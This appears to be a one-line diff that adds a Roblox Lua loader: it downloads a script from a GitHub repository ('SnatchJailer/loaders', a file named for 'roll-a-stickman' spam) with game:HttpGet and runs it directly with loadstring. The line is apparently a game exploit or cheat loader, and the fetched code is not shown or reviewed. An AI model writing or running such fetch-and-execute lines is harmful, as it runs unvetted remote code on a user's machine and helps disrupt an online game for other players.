@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/roll-a-stickman-spam2-r3jgfjobo7qksg.lua"))()
